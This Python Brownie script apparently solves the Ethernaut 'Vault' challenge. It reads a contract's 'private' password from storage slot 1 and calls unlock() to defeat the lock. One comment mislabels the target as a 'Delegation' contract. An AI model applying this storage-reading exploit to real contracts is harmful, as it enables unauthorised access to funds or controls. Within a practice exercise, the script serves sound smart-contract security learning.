from brownie import accounts, config, web3, interface


INSTANCE_ADDRESS = "0x7E58Dce155d4aDC58486f364A11464A2e96144f9"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    # grab the Delegation contract Object
    instance_contract = interface.IVault(INSTANCE_ADDRESS)

    super_secret_password = web3.eth.get_storage_at(INSTANCE_ADDRESS, 1)
    print(super_secret_password)

    instance_contract.unlock(super_secret_password, {"from": ACCOUNT})

    assert(instance_contract.locked() == False)

    print(f"Contract has been hacked. Locked is {instance_contract.locked()}")

def main():
    hack()
